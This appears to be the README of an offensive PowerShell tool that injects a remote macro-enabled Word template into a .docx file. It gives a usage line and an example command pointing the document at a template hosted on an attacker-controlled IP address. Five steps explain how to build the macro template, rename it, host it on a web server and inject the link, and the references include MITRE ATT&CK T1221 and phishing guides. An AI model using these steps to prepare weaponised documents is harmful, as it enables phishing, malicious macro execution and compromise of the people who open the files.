# Template Injection
Injects Microsoft template with macro into a Microsoft Word document.  

## Requirements
- PowerShell version 5 or greater.

## Usage
```
usage: .\TemplateInjection.ps1 DOCX URL

positional arguments:
  DOCX            .docx file to inject template into
  URL             remote Microsoft template

Example of use
To inject remote http url:

.\TemplateInjection.ps1 C:\dump\report.docx http:\\192.168.238.141\template.dot
```

## Basic steps

1. Create a Microsoft Word template with macro, and save as a .dotm file (Word Macro-Enabled Template (*.dotm)
2. Rename above to extension .dot (Word 97-2003 Template).
3. Create a new document from this template, and save as a Word .docx file.
4. Move the .dot file to a remote web server.
5. Use the PowerShell script to inject reference of the remote template location into the .docx file.

## References

- Mitre Attack: Template Injection https://attack.mitre.org/techniques/T1221/
- Phishing with MS Office: Inject Macros from a remote dotm template. https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office/inject-macros-from-a-remote-dotm-template-docx-with-macros
- RemoteInjector: Python script to Inject remote template link into word document. https://github.com/JohnWoodman/remoteinjector
- Microsoft: Internet Macros Blocked. https://learn.microsoft.com/en-us/deployoffice/security/internet-macros-blocked
